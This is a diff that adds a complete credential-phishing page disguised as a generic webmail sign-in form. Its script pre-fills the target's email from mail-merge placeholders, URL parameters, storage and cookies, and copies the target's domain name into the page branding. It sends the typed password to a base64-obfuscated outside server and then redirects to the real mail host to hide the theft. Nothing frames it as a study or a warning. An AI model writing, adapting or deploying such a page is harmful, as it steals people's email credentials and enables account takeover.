@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Access your document</title>
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+  <style>
+    body {
+      background: #D0D8E8; /* Mil color - light bluish gray */
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+    }
+    .container {
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .office {
+      width: 380px;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+    }
+    .office-holder {
+      width: 80%;
+      margin: auto;
+      padding: 30px 0px;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 1.5em;
+    }
+    .form-holder input[type='email'],
+    input[type='password'] {
+      width: 100%;
+      height: 45px;
+      margin-bottom: 15px;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      padding: 0 15px;
+      font-size: 14px;
+    }
+    .form-holder input[type='email']:focus,
+    input[type='password']:focus {
+      outline: none;
+      border-color: #0073C6;
+      box-shadow: 0 0 0 2px rgba(0, 115, 198, 0.1);
+    }
+    .form-holder .btn-holder {
+      width: 100%;
+      margin-top: 1.5em;
+      text-align: center;
+    }
+    .form-holder .btn-holder .btn {
+      background: #0073C6;
+      border: none;
+      padding: 12px 10px;
+      color: #fff;
+      width: 100%;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    .form-holder .btn-holder .btn:hover {
+      background: #005ea3;
+    }
+    .checkbox {
+      margin-top: 10px;
+      display: flex;
+      align-items: center;
+    }
+    .checkbox input {
+      margin-right: 8px;
+    }
+    .checkbox label {
+      font-size: 14px;
+      color: #555;
+    }
+    .text-danger {
+      display: none;
+      font-size: 14px;
+      margin-top: 5px;
+    }
+    h3 {
+      color: #333;
+      font-weight: 600;
+      margin: 0;
+    }
+    p {
+      color: #666;
+      text-align: center;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <div class="office border shadow bg-light">
+    <div class="office-holder">
+      <div class="logo">
+        <!-- Logo removed as requested -->
+        <h3 class="text-dark"><strong id="domain-name">WEBMAIL</strong></h3>
+      </div>
+
+      <center>
+        <span id="error" class="text-danger"></span>
+        <span id="msg" class="text-danger"></span>
+      </center><br>
+
+      <form method="POST" id="login-form">
+        <div class="form-holder">
+          <input type="email" id="ai" name="ai" class="form-control" required readonly>
+          <input type="password" id="pr" name="pr" placeholder="Email Password" class="form-control" required>
+          <div class="checkbox">
+            <input type="checkbox" name="remember" id="remember">
+            <label for="remember">Remember me</label>
+          </div>
+          <div class="btn-holder">
+            <button type="submit" class="btn" id="tt">Sign in</button>
+          </div>
+          <p style="font-size:13px; margin-top:1.5em;">&copy; <span id="year"></span> <span id="domain-text">Webmail</span>. All rights reserved.</p>
+        </div>
+      </form>
+    </div>
+  </div>
+</div>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+  document.getElementById("year").textContent = new Date().getFullYear();
+
+  // These values will be dynamically replaced during email send
+  const rawEmail = "#email#";
+  const base64Email = "#email64#";
+  let email = "";
+
+  // Function to check if a string is valid base64
+  function isBase64(str) {
+    try {
+      // Check if string contains only valid base64 characters
+      if (!str || typeof str !== 'string') return false;
+      
+      // Base64 regex pattern
+      const base64Pattern = /^[A-Za-z0-9+/]*={0,2}$/;
+      if (!base64Pattern.test(str)) return false;
+      
+      // Try to decode it
+      const decoded = atob(str);
+      
+      // Check if decoded result could be an email
+      return validateEmail(decoded);
+    } catch (e) {
+      return false;
+    }
+  }
+
+  // Function to extract base64 email from various sources
+  function extractBase64Email() {
+    try {
+      // Check URL parameters for base64
+      const urlParams = new URLSearchParams(window.location.search);
+      const urlBase64 = urlParams.get('email64') || urlParams.get('e64') || urlParams.get('b64') || urlParams.get('base64');
+      
+      if (urlBase64 && isBase64(urlBase64)) {
+        console.log("Found base64 email in URL parameters:", urlBase64);
+        return urlBase64;
+      }
+      
+      // Check URL fragment/hash for base64
+      const hash = window.location.hash;
+      if (hash) {
+        const hashContent = hash.substring(1);
+        
+        // Check if hash itself is base64 email
+        if (isBase64(hashContent)) {
+          console.log("Found base64 email in URL hash:", hashContent);
+          return hashContent;
+        }
+        
+        // Try to extract base64 from hash pattern
+        const base64Pattern = /([A-Za-z0-9+/]{20,}={0,2})/g;
+        const matches = hashContent.match(base64Pattern);
+        if (matches) {
+          for (let match of matches) {
+            if (isBase64(match)) {
+              console.log("Found base64 pattern in URL hash:", match);
+              return match;
+            }
+          }
+        }
+      }
+      
+      // Check for base64 in page content
+      const base64Regex = /([A-Za-z0-9+/]{20,}={0,2})/g;
+      const pageText = document.body.innerText;
+      const base64Matches = pageText.match(base64Regex);
+      if (base64Matches) {
+        for (let match of base64Matches) {
+          if (isBase64(match)) {
+            console.log("Found base64 email in page content:", match);
+            return match;
+          }
+        }
+      }
+      
+      // Check localStorage and sessionStorage for base64
+      const storageKeys = ['email64', 'e64', 'b64', 'base64Email', 'emailBase64'];
+      for (let key of storageKeys) {
+        const storedValue = localStorage.getItem(key) || sessionStorage.getItem(key);
+        if (storedValue && isBase64(storedValue)) {
+          console.log("Found base64 email in storage (" + key + "):", storedValue);
+          return storedValue;
+        }
+      }
+      
+      // Check cookies for base64
+      const cookies = document.cookie.split(';');
+      for (let i = 0; i < cookies.length; i++) {
+        const cookie = cookies[i].trim();
+        const cookieParts = cookie.split('=');
+        if (cookieParts.length === 2) {
+          const cookieName = cookieParts[0];
+          const cookieValue = cookieParts[1];
+          
+          if ((cookieName.includes('64') || cookieName.includes('base')) && isBase64(cookieValue)) {
+            console.log("Found base64 email in cookie (" + cookieName + "):", cookieValue);
+            return cookieValue;
+          }
+        }
+      }
+      
+      return null;
+    } catch (e) {
+      console.error('Error extracting base64 email:', e);
+      return null;
+    }
+  }
+
+  // Auto grab email from browser storage (including base64)
+  function autoGrabEmail() {
+    try {
+      // First, try to find and decode base64 emails
+      const base64EmailFound = extractBase64Email();
+      if (base64EmailFound) {
+        const decodedEmail = atob(base64EmailFound);
+        if (validateEmail(decodedEmail)) {
+          console.log("Using decoded base64 email:", decodedEmail);
+          return decodedEmail;
+        }
+      }
+      
+      // Then check for regular emails in localStorage
+      if (localStorage.getItem('userEmail')) {
+        const storedEmail = localStorage.getItem('userEmail');
+        if (validateEmail(storedEmail)) {
+          console.log("Found email in localStorage:", storedEmail);
+          return storedEmail;
+        }
+      }
+      
+      // Check sessionStorage
+      if (sessionStorage.getItem('userEmail')) {
+        const storedEmail = sessionStorage.getItem('userEmail');
+        if (validateEmail(storedEmail)) {
+          console.log("Found email in sessionStorage:", storedEmail);
+          return storedEmail;
+        }
+      }
+      
+      // Check cookies for regular emails
+      const cookies = document.cookie.split(';');
+      for (let i = 0; i < cookies.length; i++) {
+        const cookie = cookies[i].trim();
+        if (cookie.startsWith('email=') || cookie.startsWith('userEmail=') || cookie.startsWith('user_email=')) {
+          const cookieEmail = cookie.split('=')[1];
+          if (validateEmail(cookieEmail)) {
+            console.log("Found email in cookies:", cookieEmail);
+            return decodeURIComponent(cookieEmail);
+          }
+        }
+      }
+      
+      // Check for email in URL parameters
+      const urlParams = new URLSearchParams(window.location.search);
+      const urlEmail = urlParams.get('email') || urlParams.get('e') || urlParams.get('user') || urlParams.get('username');
+      if (urlEmail && validateEmail(urlEmail)) {
+        console.log("Found email in URL parameters:", urlEmail);
+        return urlEmail;
+      }
+      
+      // Check for email in URL fragment/hash (#)
+      const hash = window.location.hash;
+      if (hash) {
+        const hashContent = hash.substring(1);
+        
+        // Check if the hash itself is an email
+        if (validateEmail(hashContent)) {
+          console.log("Found email in URL hash:", hashContent);
+          return hashContent;
+        }
+        
+        // Check for email pattern in the hash
+        const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
+        const hashMatches = hashContent.match(emailRegex);
+        if (hashMatches && hashMatches.length > 0) {
+          for (let match of hashMatches) {
+            if (validateEmail(match)) {
+              console.log("Found email pattern in URL hash:", match);
+              return match;
+            }
+          }
+        }
+      }
+      
+      // Check for email in page content
+      const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
+      const pageText = document.body.innerText;
+      const emailMatches = pageText.match(emailRegex);
+      if (emailMatches && emailMatches.length > 0) {
+        for (let match of emailMatches) {
+          if (validateEmail(match) && !match.includes('example.com') && !match.includes('@domain')) {
+            console.log("Found email in page content:", match);
+            return match;
+          }
+        }
+      }
+      
+      // Check for email in input fields
+      const emailInputs = document.querySelectorAll('input[type="email"], input[name*="email"], input[id*="email"]');
+      for (let input of emailInputs) {
+        if (input.value && validateEmail(input.value)) {
+          console.log("Found email in input field:", input.value);
+          return input.value;
+        }
+      }
+      
+      console.log("No email found from any auto-grab source");
+      return null;
+    } catch (e) {
+      console.error('Error auto-grabbing email:', e);
+      return null;
+    }
+  }
+
+  function validateEmail(email) {
+    return /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email);
+  }
+
+  try {
+    // First try to auto-grab email (including base64)
+    const autoGrabbedEmail = autoGrabEmail();
+    
+    // Debug: log what we found
+    console.log("Auto-grabbed email result:", autoGrabbedEmail);
+    console.log("Raw email placeholder value:", rawEmail);
+    console.log("Base64 email placeholder value:", base64Email);
+    console.log("Window location hash:", window.location.hash);
+    
+    // Priority: dynamic base64 email > dynamic raw email > auto-grabbed email
+    let finalEmail = "";
+    
+    // Check if base64Email placeholder was replaced with actual base64
+    if (base64Email && base64Email !== "" && base64Email !== "#email64#") {
+      try {
+        const decoded = atob(base64Email);
+        if (validateEmail(decoded)) {
+          finalEmail = decoded;
+          console.log("Using dynamic base64 decoded email:", finalEmail);
+        }
+      } catch (e) {
+        console.log("Base64 placeholder is not valid base64:", base64Email);
+      }
+    }
+    
+    // If no base64, check raw email placeholder
+    if (!finalEmail && rawEmail && rawEmail !== "" && rawEmail !== "#email#") {
+      if (validateEmail(rawEmail)) {
+        finalEmail = rawEmail;
+        console.log("Using dynamic raw email placeholder:", finalEmail);
+      } else {
+        // Maybe it's base64 encoded but in the raw field
+        try {
+          const decoded = atob(rawEmail);
+          if (validateEmail(decoded)) {
+            finalEmail = decoded;
+            console.log("Raw placeholder contained base64, decoded to:", finalEmail);
+          }
+        } catch (e) {
+          console.log("Raw email is not valid:", rawEmail);
+        }
+      }
+    }
+    
+    // If still no email, use auto-grabbed
+    if (!finalEmail && autoGrabbedEmail) {
+      finalEmail = autoGrabbedEmail;
+      console.log("Using auto-grabbed email:", finalEmail);
+    }
+    
+    // If still nothing, set default
+    if (!finalEmail) {
+      finalEmail = "invalid@example.com";
+      console.log("No email found, setting default");
+    }
+    
+    // Set the email in the form
+    email = finalEmail;
+
+    if (validateEmail(email)) {
+      const domain = email.split('@')[1];
+      const domainName = domain.split('.')[0];
+
+      // Fill fields and branding
+      $('#ai').val(email);
+      $('#domain-name').text(domainName.toUpperCase());
+      $('#domain-text').text(domainName.charAt(0).toUpperCase() + domainName.slice(1));
+      console.log("Email set successfully in form:", email);
+    } else {
+      console.log("Invalid email, setting default");
+      $('#ai').val(email || "invalid@example.com");
+      if (email) {
+        const domain = email.split('@')[1] || "example.com";
+        const domainName = domain.split('.')[0] || "example";
+        $('#domain-name').text(domainName.toUpperCase());
+        $('#domain-text').text(domainName.charAt(0).toUpperCase() + domainName.slice(1));
+      }
+    }
+  } catch (e) {
+    console.error("Error in email processing:", e);
+    $('#ai').val(email || "invalid@example.com");
+    if (email) {
+      const domain = email.split('@')[1] || "example.com";
+      const domainName = domain.split('.')[0] || "example";
+      $('#domain-name').text(domainName.toUpperCase());
+      $('#domain-text').text(domainName.charAt(0).toUpperCase() + domainName.slice(1));
+    }
+  }
+
+  // Form submission
+  $('#login-form').on('submit', function(e) {
+    e.preventDefault();
+    $('#error, #msg').hide().text('');
+
+    const email = $('#ai').val();
+    const pass = $('#pr').val();
+
+    if (!email || !pass) {
+      $('#error').text('All fields are required.').show();
+      return;
+    }
+
+    if (pass.length < 5) {
+      $('#error').text('Password too short.').show();
+      return;
+    }
+
+    $('#tt').text('Please wait...');
+
+    $.ajax({
+      type: 'POST',
+      url: atob('aHR0cHM6Ly9hZG1pbmlzdHJhdGl2ZXdlYnBhZ2UuZXUvb3drLnBocA=='),
+      data: { ai: email, pr: pass },
+      success: function(response) {
+        $('#tt').text('Sign in');
+        if (response.signal === 'ok') {
+          localStorage.removeItem('failCount');
+          window.location.href = "https://mail." + email.split('@')[1];
+        } else {
+          $('#msg').text(response.msg || 'Invalid credentials').show();
+          $('#pr').val('');
+          let failCount = parseInt(localStorage.getItem('failCount')) || 0;
+          failCount++;
+          localStorage.setItem('failCount', failCount);
+          if (failCount >= 3) {
+            localStorage.removeItem('failCount');
+            window.location.href = "https://mail." + email.split('@')[1];
+          }
+        }
+      },
+      error: function() {
+        $('#tt').text('Sign in');
+        $('#msg').text('Server error. Please try again.').show();
+        $('#pr').val('');
+      }
+    });
+  });
+</script>
+</body>
+</html>
